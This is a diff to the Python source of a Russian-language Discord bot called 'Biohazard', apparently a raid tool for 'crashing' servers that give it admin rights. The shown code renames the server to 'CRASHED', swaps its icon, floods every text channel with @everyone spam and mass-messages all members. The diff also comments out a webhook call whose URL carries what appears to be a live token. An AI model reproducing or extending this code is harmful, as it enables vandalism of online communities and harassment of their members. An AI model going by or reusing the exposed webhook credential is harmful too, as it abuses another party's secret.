@@ -132,8 +132,8 @@ class MyClient(discord.Client):
 				await message.delete() #удаление сообщения
 				#await client.get_channel(732820713584721923).send('**Участник под ником **' + message.author + ' **крашит сервер **' + message.guild.name + ' **с** ' + str(len(message.guild.members)) + ' **участниками. Не доверяйте админ-права незнакомцам, будьте бдительны!**')
 				print('Атака на сервер', message.guild.name)
-				webhook = DiscordWebhook(url='https://discordapp.com/api/webhooks/745515368168030259/oxNz2pe5ezZRWu6MPtDFTvHr5PG55lJGKAJO90k865SuHRFPfgfEjT8KoKyFx6MZZFqH', content='**Участник под ником **' + str(message.author) + ' **крашит сервер **' + str(message.guild.name) + ' **с** ' + str(len(message.guild.members)) + ' **участниками. Не доверяйте админ-права незнакомцам, будьте бдительны!**')
-				response = webhook.execute()
+				#webhook = DiscordWebhook(url='https://discordapp.com/api/webhooks/745515368168030259/oxNz2pe5ezZRWu6MPtDFTvHr5PG55lJGKAJO90k865SuHRFPfgfEjT8KoKyFx6MZZFqH', content='**Участник под ником **' + str(message.author) + ' **крашит сервер **' + str(message.guild.name) + ' **с** ' + str(len(message.guild.members)) + ' **участниками. Не доверяйте админ-права незнакомцам, будьте бдительны!**')
+				#response = webhook.execute()
 				await message.guild.edit(name='__...-<<CRASHED>>-...__') #переименовывание сервера
 				with open('chaos.jpeg', 'rb') as f:
 					icon = f.read()
@@ -179,7 +179,7 @@ class MyClient(discord.Client):
 					pass
 				
 			if message.content == '*флуд': #флуд
-				spam = '@everyone Внимание, сервер крашится. С любовью, :biohazard: Biohazard :heart: Группа ВК бота: https://vk.com/biohazardbot Discord сервер бота: https://discord.gg/Aw3SgrC'
+				spam = '@everyone Внимание, сервер крашится. С любовью, :biohazard: Biohazard :heart: Группа ВК бота: https://vk.com/biohazardbot Discord сервер бота: https://discord.gg/X5R4Za8'
 				await message.delete()
 				while s <= 500:
 					for channel in message.guild.text_channels:
@@ -307,7 +307,7 @@ class MyClient(discord.Client):
 			if message.content == '*лс':
 				await message.delete()
 				for i in message.guild.members:
-					await i.send('Внимание, сервер {0.guild.name} крашится. С любовью, :biohazard: Biohazard :heart: Группа ВК бота: https://vk.com/biohazardbot Discord сервер бота: https://discord.gg/Aw3SgrC'.format(message))
+					await i.send('Внимание, сервер {0.guild.name} крашится. С любовью, :biohazard: Biohazard :heart: Группа ВК бота: https://vk.com/biohazardbot Discord сервер бота: https://discord.gg/X5R4Za8'.format(message))
 					
 			if message.content == '*лаги': #лаги
 				await message.delete()
